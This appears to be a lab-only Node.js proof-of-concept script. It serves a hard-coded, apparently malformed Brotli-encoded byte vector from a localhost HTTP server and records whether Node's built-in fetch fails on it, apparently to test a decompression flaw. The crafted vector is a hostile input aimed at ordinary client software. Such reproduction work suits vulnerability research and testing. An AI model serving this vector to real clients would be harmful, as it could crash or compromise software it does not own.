/**
 * Simulates attacker-controlled br response via local HTTP (lab only).
 */
import http from 'node:http';
import { once } from 'node:events';

const VECTOR = Buffer.from(
  '200010414141fcffff07002228f00b60f7f41f000000',
  'hex',
);

const server = http.createServer((_req, res) => {
  res.writeHead(200, {
    'Content-Type': 'application/octet-stream',
    'Content-Encoding': 'br',
  });
  res.end(VECTOR);
});
server.listen(0, '127.0.0.1');
await once(server, 'listening');
const { port } = server.address();

let fetchResult;
try {
  const res = await fetch(`http://127.0.0.1:${port}/`);
  await res.arrayBuffer();
  fetchResult = { ok: true, status: res.status };
} catch (e) {
  fetchResult = { ok: false, code: e.cause?.code ?? e.code, message: String(e.message) };
}
server.close();

console.log(JSON.stringify({ nodeVersion: process.version, fetchResult, port }, null, 2));
